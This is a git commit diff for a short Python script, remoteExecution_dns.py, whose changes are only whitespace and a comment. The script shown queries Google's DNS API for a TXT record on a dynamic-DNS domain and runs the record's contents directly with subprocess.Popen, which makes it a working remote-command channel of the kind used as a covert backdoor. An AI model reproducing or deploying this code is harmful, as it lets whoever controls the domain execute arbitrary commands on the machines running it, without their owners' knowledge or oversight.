eb5cd1a60b93d331acd91a3cde9f0b2c238a9ca9
Shami Lakhani <shami.lakhani@argos.co.uk>
2019-01-23 14:40:37 +0000

    Update remoteExecution_dns.py

--- remoteExecution_dns.py
+++ remoteExecution_dns.py
@@ -1,10 +1,12 @@
 #! /usr/bin/python
 # Author: ShamiLakhani@hotmail.com
 # Version:  0.1 - Draft.
-# Objective: Reads and executes a command set in a text record of a domain. 
+# Objective: Reads and executes a command set in a text record of a domain.
 # Uses Google DNS API to query the domain and read the record.
 
 import requests, json
+
+#main:
 domain = "remotecommand.remotecontrol.cloudns.cx"
 page = requests.get ("https://dns.google.com/resolve?name="+ domain + "&type=TXT&cd=1")
 
@@ -13,7 +15,7 @@ if page.status_code == 200:
     executeCommand = (j['Answer'][0]['data'])
     from subprocess import Popen
     #Debug: print (executeCommand)
-    Popen (executeCommand) 
+    Popen (executeCommand)
     exit()
 else:
     print (page.status_code)
